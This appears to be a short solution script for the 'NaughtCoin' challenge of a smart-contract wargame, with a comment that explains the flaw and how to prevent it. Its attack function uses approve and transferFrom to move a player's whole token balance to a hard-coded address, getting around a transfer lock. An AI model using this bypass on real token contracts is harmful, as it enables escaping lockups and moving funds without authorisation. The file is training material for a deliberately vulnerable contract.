/**

NaughtCoin
 
Vulnerability: 
Inherited functions allow unwanted work-arounds

Preventative Techniques:
Beware of what the contract inherits and take care of potential work-arounds

*/

const attack = async () => {

    const receiver = "0x1A19081C150a6478284aF73f1E2cBE503b9da09f";

    const balance = await contract.balanceOf(player);

    await contract.approve(player, balance);

    await contract.transferFrom(player, receiver, balance);
}
